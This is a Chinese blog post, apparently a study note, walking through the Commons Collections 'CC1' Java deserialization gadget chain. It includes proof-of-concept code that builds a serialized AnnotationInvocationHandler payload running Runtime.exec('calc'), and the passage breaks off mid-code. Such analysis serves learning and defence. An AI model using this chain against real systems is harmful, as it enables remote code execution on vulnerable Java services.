<!-- build time:Thu Jan 18 2024 13:01:15 GMT+0800 (China Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="ä½™æ˜Ÿé…’" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Javaä»£ç å®¡è®¡,åˆ©ç”¨é“¾åˆ†æ"><link rel="canonical" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/"><title>CC1åˆ†æ - ä»£ç å®¡è®¡ | ä½™æ˜Ÿé…’ = ä½™æ˜Ÿé…’ = ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CC1åˆ†æ</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2023-03-02 18:14:29"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2023-03-02T18:14:29+08:00">2023-03-02</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ä½™æ˜Ÿé…’</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicli3sbvtj20zk0m8x6p.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipesx5fdwj20zk0m81kx.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="item" rel="index" title="åˆ†ç±»äº ä»£ç å®¡è®¡"><span itemprop="name">ä»£ç å®¡è®¡</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="ä½™æ˜Ÿé…’"><meta itemprop="description" content="ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸, æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ä½™æ˜Ÿé…’"></span><div class="body md" itemprop="articleBody"><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>å‚è€ƒè§†é¢‘ : <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW5vNHkxVTdFMS8/c3BtX2lkX2Zyb209MzMzLjk5OS4wLjA=">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP_å“”å“©å“”å“©_bilibili</span></p><h1 id="æ‰‹åŠ¨åˆ†æ"><a href="#æ‰‹åŠ¨åˆ†æ" class="headerlink" title="æ‰‹åŠ¨åˆ†æ"></a>æ‰‹åŠ¨åˆ†æ</h1><h2 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h2><h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><p>è¿™é‡Œçš„jdké€‰æ‹©<code>java8u71</code>â€‹ä»¥ä¸‹ï¼Œå› ä¸ºåœ¨<code>java8u71</code>â€‹è¯¥æ¼æ´è¢«ä¿®å¤äº†ï¼Œé€‰æ‹©çš„æ˜¯<code>java8u65</code>â€‹( å’Œè§†é¢‘ä¸­çš„åšä¸»ä¸€æ · )</p><h3 id="ç»„ä»¶"><a href="#ç»„ä»¶" class="headerlink" title="ç»„ä»¶"></a>ç»„ä»¶</h3><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>commons-collections3.2.1</code>â€‹ï¼Œå¯ä»¥ä½¿ç”¨mavenä¹Ÿå¯ä»¥è‡ªè¡Œä¸‹è½½æ‰‹åŠ¨å¯¼å…¥</p><pre><code class="xml">    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
            &lt;version&gt;3.2.1&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>åœ¨æœ€åçš„è°ƒè¯•é˜¶æ®µéœ€è¦èƒ½å¤Ÿè¯»å–sunæºç ï¼Œæºç å¯ä»¥é€šè¿‡OpenJDKï¼ˆ<span class="exturl" data-url="aHR0cHM6Ly9oZy5vcGVuamRrLm9yZy9qZGs4dS9qZGs4dS9qZGsvYXJjaGl2ZS9hZjY2MDc1MGIyZjQuemlwJUVGJUJDJTg5JUU0JUI4JUFEJUU0JUI4JThCJUU4JUJEJUJE">https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zipï¼‰ä¸­ä¸‹è½½</span></p><ol><li>å…ˆå°†åŸå…ˆjdkç›®å½•ä¸‹çš„srcå‹ç¼©åŒ…è§£å‹</li></ol><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917110407.png">â€‹<ol start="2"><li>æ‰“å¼€ä¸‹è½½çš„æ–‡ä»¶ï¼Œå°†<code>src/share/classes</code>â€‹ä¸‹çš„<code>sun</code>â€‹æ‹–åˆ°è¯¥ç›®å½•ä¸‹</li></ol><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917110529.png">3. æ‰“å¼€IDEA <img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917110703.png">â€‹ <img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/image-20230917110758-gw39hop.png" title="image">â€‹<p>å¯¼å…¥æˆåŠŸåå°±å¯ä»¥æŸ¥çœ‹æºç äº†</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917110925.png">â€‹<h2 id="ç±»åˆ†æ"><a href="#ç±»åˆ†æ" class="headerlink" title="ç±»åˆ†æ"></a>ç±»åˆ†æ</h2><p><strong>æ¼æ´å‘ç°</strong> : <code>commons-collections.jar</code>â€‹æ ¹è·¯å¾„ä¸‹çš„<code>Transformer</code>â€‹ç±»</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917111113.png">â€‹<p>å…·ä½“åŠŸèƒ½æ˜¯ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œä¼šè°ƒç”¨è¯¥å¯¹è±¡çš„<code>transform</code>â€‹æ–¹æ³•</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917111241.png">â€‹<p>é€šè¿‡<code>ctrl+alt+é¼ æ ‡å·¦é”®</code>â€‹å°±èƒ½æŸ¥çœ‹å®ç°ç±»</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916110644.png">â€‹<p>è¿™äº›éƒ½æ˜¯å®ƒçš„å®ç°ç±»</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>å…ˆæŸ¥çœ‹æ„é€ å‡½æ•°</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916111325.png">â€‹<p>â€</p><p>å…¶ä¸­çš„<code>iMethodName</code>â€‹ã€<code>iParamTypes</code>â€‹éƒ½æ˜¯å¯æ§çš„ï¼ˆ åœ¨åˆ›å»ºè¯¥ç±»ä¼ å…¥å³å¯ ï¼‰çŸ¥é“è¿™é‡Œå¯æ§åï¼Œå¯ä»¥å°è¯•æ‰§è¡Œå‘½ä»¤</p><p>å†æŸ¥çœ‹å®ƒçš„<code>transform</code>â€‹æ–¹æ³•</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916111019.png">â€‹<ol><li>é€šè¿‡ä¼ å…¥ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œè·å–å…¶å¯¹åº”çš„classç±»</li><li>é€šè¿‡åå°„è·å–å…¶æ–¹æ³•</li><li>æœ€åé€šè¿‡invokeæ‰§è¡Œæ–¹æ³•</li></ol><p>æ˜ç™½æµç¨‹åå°±å¯ä»¥å°è¯•æ„é€ </p><pre><code class="java">package cc;

import org.apache.commons.collections.functors.InvokerTransformer;
import java.lang.reflect.InvocationTargetException;

public class cc1 &#123;

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;
        // é€šè¿‡åå°„è°ƒç”¨execæ‰§è¡Œå‘½ä»¤
        Runtime r = Runtime.getRuntime();
        Class&lt;? extends Runtime&gt; aClass = r.getClass();
        Object invoke = aClass.getMethod(&quot;getRuntime&quot;);
        aClass.getMethod(&quot;exec&quot;, String.class).invoke(invoke, &quot;calc&quot;);

        Runtime transfromR = Runtime.getRuntime();
        // è¿™æ˜¯é€šè¿‡ä¼ å…¥Runtimeç±»å¯¹è±¡,é€šè¿‡åå°„è·å–å…¶execæ–¹æ³•,ä¼ å…¥calcå‚æ•°,å¯¼è‡´å¼¹å‡ºè®¡ç®—å™¨
        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(transfromR);
    &#125;
&#125;
</code></pre><p>é€šè¿‡<code>new InvokerTransformer()</code>â€‹ä¼ å…¥ä¸‰ä¸ªå‚æ•°åè°ƒç”¨äº†å¯¹åº”çš„<code>transfrom()</code>â€‹æ–¹æ³•ï¼Œè¿™ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸º æ–¹æ³•åã€å‚æ•°ç±»å‹(æ•°ç»„)ã€å€¼(æ•°ç»„)ï¼Œ<code>transfrom</code>â€‹æ¥æ”¶äº†ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œ<code>new InvokerTransformer()</code>â€‹ä¼ é€’çš„ä¸‰ä¸ªå‚æ•°å°±æ˜¯é€šè¿‡åè€…æä¾›çš„ç±»å¯¹è±¡æ¥è¿›è¡Œè°ƒç”¨(åå°„è°ƒç”¨)</p><p>å½“æˆ‘ä»¬äº†è§£äº†è¿™äº›åï¼Œå°±çŸ¥é“è¯¥ç±»çš„<code>transfrom</code>â€‹æ–¹æ³•æ˜¯ä¸€ä¸ªå±é™©æ–¹æ³• [<code>InvokerTransformer.transfrom()</code>â€‹]ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦æŸ¥çœ‹è°çš„é‡Œé¢è°ƒç”¨äº†<code>transfrom</code>â€‹æ–¹æ³•</p><p>è¿™é‡Œå¯ä»¥é€šè¿‡å³é”®<code>transfrom()</code>â€‹æŸ¥çœ‹å“ªäº›è°ƒç”¨äº†ï¼ˆç›®çš„å°±æ˜¯æŸ¥çœ‹åˆ°ä¸åŒåå­—å¯ä»¥è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå°±å¯ä»¥ç»§ç»­å¾€ä¸‹èµ°ï¼‰</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/image-20230916121558-6fb0482.png" title="image"><p>ä½†æ˜¯é»˜è®¤çš„æœç´¢åªä¼šåœ¨é¡¹ç›®ä¸­æŸ¥æ‰¾ï¼Œä¸ä¼šå»Libä¸­æŸ¥æ‰¾ï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹é»˜è®¤é…ç½®</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/image-20230916121727-zw6kmpo.png" title="image">â€‹ <img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/image-20230916121742-whh10do.png" title="image">â€‹<p>â€</p><h3 id="TransformeMap"><a href="#TransformeMap" class="headerlink" title="TransformeMap"></a>TransformeMap</h3><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916122758.png">â€‹<p>é€šè¿‡æœç´¢å¯ä»¥çœ‹åˆ°åœ¨<code>TransformeMap</code>â€‹ä¸­<code>trasnform</code>â€‹è¢«è°ƒç”¨äº†å¾ˆå¤šæ¬¡ï¼ŒæŸ¥çœ‹è¯¥ç±»çš„æ„é€ å‡½æ•°</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/111222333.png">â€‹<p><code>TransformedMap</code>â€‹ç±»çš„æ„é€ å‡½æ•°æ˜¯ä¸€ä¸ª<code>protected</code>â€‹ç±»å‹ï¼Œåªå…è®¸åŒä¸€ä¸ªåŒ…å†…çš„ç±»æˆ–å­ç±»è°ƒç”¨ï¼Œå®ƒä¼šä¼ å…¥ä¸€ä¸ªmapå¯¹è±¡ï¼Œä¹‹åä¼šä¼ å…¥ä¸¤ä¸ªTransformerå¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯keyï¼Œå¦ä¸€ä¸ªæ˜¯valueï¼Œåˆ†åˆ«å¯¹è¿™keyå’Œvalueè¿›è¡Œæ“ä½œ</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916141346.png">â€‹<p>é€šè¿‡è¯¥ç±»ä¸­çš„<code>decorate</code>â€‹æ–¹æ³•å¯æˆåŠŸè·å–è¯¥ç±»çš„å®ä¾‹å¯¹è±¡ï¼Œè€Œä¼ å…¥çš„<code>valueTransformer</code>â€‹å¯¹è±¡åˆ™ä¼šåœ¨ä¸‹æ–¹çš„<code>checkSetVallue</code>â€‹ä¸­å®ç°è°ƒç”¨<code>transform</code>â€‹</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916141247.png">â€‹<p>é‚£ä¹ˆæƒ³è¦å®ç°ä¼ é€’è¿›æ¥çš„Transformerå¯¹è±¡è°ƒç”¨trasnformæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›æŸ¥çœ‹</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916141649.png">â€‹<h3 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h3><p>å‘ç°åœ¨<code>AbstractInputCheckedMapDecorator</code>â€‹ç±»ä¸­å­˜åœ¨ä¸€ä¸ª<code>setValue</code>â€‹æ–¹æˆåŠŸè°ƒç”¨äº†<code>checkSetVallue</code>â€‹ï¼Œè€Œè¿™ä¸ªç±»è¿˜æ˜¯<code>TrasnformedMap</code>â€‹çš„çˆ¶ç±»</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916141904.png">â€‹<p>æŸ¥çœ‹<code>AbstractInputCheckedMapDecorator</code>â€‹ç±»ï¼Œå‘ç°<code>setValue</code>â€‹æ˜¯åœ¨ä¸€ä¸ª<code>MapEntry</code>â€‹ä¸­å®ç°</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916141949.png">â€‹<p>â€</p><p>è€Œè¿™ä¸ª<code>MapEntry</code>â€‹çš„<code>setValue</code>â€‹æ–¹æ³•å¸¸ç”¨äºæ›´æ–°<code>Map</code>â€‹ä¸­é”®å€¼å¯¹ä¸­çš„å€¼ï¼ˆéå†æ›´æ–°ç­‰åœºæ™¯ï¼‰æ­¤æ—¶å°±å¯ä»¥åšä¸€äº›ç®€å•çš„æ„é€ </p><pre><code class="java">package cc;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class cc1 &#123;

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;

        Runtime transfromR = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);

        HashMap&lt;Object, Object&gt; testMap = new HashMap&lt;&gt;();
        testMap.put(&quot;key&quot;, &quot;value&quot;);

        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(testMap, null, invokerTransformer); // ä¼ å…¥mapå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸éœ€è¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼šæ‰§è¡Œtransformæ–¹æ³•ï¼Œä¼ å…¥ä¸Šé¢å®šä¹‰çš„Transformerå¯¹è±¡

        for (Map.Entry entry: decorate.entrySet()) &#123;
            entry.setValue(transfromR);
        &#125;
    &#125;
&#125;
</code></pre><p>å¦‚æœæœ‰ä¸€ä¸ªéå†æ•°ç»„çš„åœ°æ–¹å¹¶ä¸”è°ƒç”¨äº†<code>setValue</code>â€‹æ–¹æ³•é‚£ä¹ˆå°±å¯ä»¥æˆåŠŸåˆ©ç”¨</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>å†æ¬¡è¿½è¸ªå‘ç°äº†åœ¨<code>readObject</code>â€‹ä¸­ä½¿ç”¨mapéå†å¹¶è°ƒç”¨äº†<code>setValue</code>â€‹</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916154655.png">æŸ¥çœ‹å…¶æ„é€ å‡½æ•° <img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916155102.png"><p>è¿™ä¸ªæ„é€ å‡½æ•°æ²¡æœ‰æä¾›publicï¼Œåªå…è®¸åŒä¸€ä¸ªåŒ…å†…è°ƒç”¨å¯ä»¥ä½¿ç”¨åå°„ï¼Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯classç±»å¯¹è±¡ï¼ˆç»§æ‰¿äº†<code>Annotation</code>â€‹æ³¨è§£çš„å¯¹è±¡ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯mapå¯¹è±¡ï¼ˆè¿™ä¸ªå¯æ§ï¼‰</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916162229.png">â€‹<p>é€šè¿‡<code>readObject()</code>â€‹æ–¹æ³•æ‰§è¡Œmapéå†ï¼Œæœ€ç»ˆè°ƒç”¨<code>setValue</code>â€‹æ–¹æ³•ï¼Œè¿™é‡Œæ— æ³•é€šè¿‡å¸¸è§„æ‰‹æ®µè·å–è¯¥ç±»çš„å¯¹è±¡ï¼Œåªèƒ½é€šè¿‡åå°„è·å–</p><pre><code class="java">package cc;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class cc1 &#123;

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, ClassNotFoundException, IOException &#123;

        Runtime transfromR = Runtime.getRuntime(); // ç”±äºgetRuntimeè·å–çš„æ˜¯newå¯¹è±¡,æ— æ³•è¿›è¡Œåºåˆ—åŒ–,éœ€è¦è·å–å…¶classå¯¹è±¡
        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); // è·å–æ‰§è¡Œå‡½æ•°
        HashMap&lt;Object, Object&gt; testMap = new HashMap&lt;&gt;(); // æ–°å»ºä¸€ä¸ªmap
        testMap.put(&quot;key&quot;, &quot;value&quot;); // æ·»åŠ æ•°æ®éšä¾¿å¡«

        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(testMap, null, invokerTransformer); // ä¼ å…¥mapå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸éœ€è¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼šæ‰§è¡Œtransformæ–¹æ³•ï¼Œä¼ å…¥ä¸Šé¢å®šä¸€ä¸ªTransformerå¯¹è±¡

        Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); // å¯¹è±¡é€šè¿‡åå°„è·å–å…¶classå¯¹è±¡
        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); // è·å–å…¶æ„é€ æ–¹æ³•
        declaredConstructor.setAccessible(true); // å…³é—­CC1æ£€æµ‹
        Object o = declaredConstructor.newInstance(Override.class, decorate); // åˆå§‹åŒ–è¯¥å¯¹è±¡

        serialize(o, &quot;cc1.ser&quot;); // åºåˆ—åŒ–è¯¥å¯¹è±¡

        deserialize(&quot;cc1.ser&quot;); // ååºåˆ—åŒ–è¯¥å¯¹è±¡ï¼Œç”±äºè¯¥å¯¹è±¡æ‰§è¡ŒreadObject()æ–¹æ³•ï¼Œä¼šéå†mapï¼ŒsetValueæ‰§è¡Œï¼Œå¯¼è‡´checkSetValueæ‰§è¡Œï¼Œæœ€ç»ˆè°ƒç”¨invokerTransformer.transformæ‰§è¡Œ
&#125;
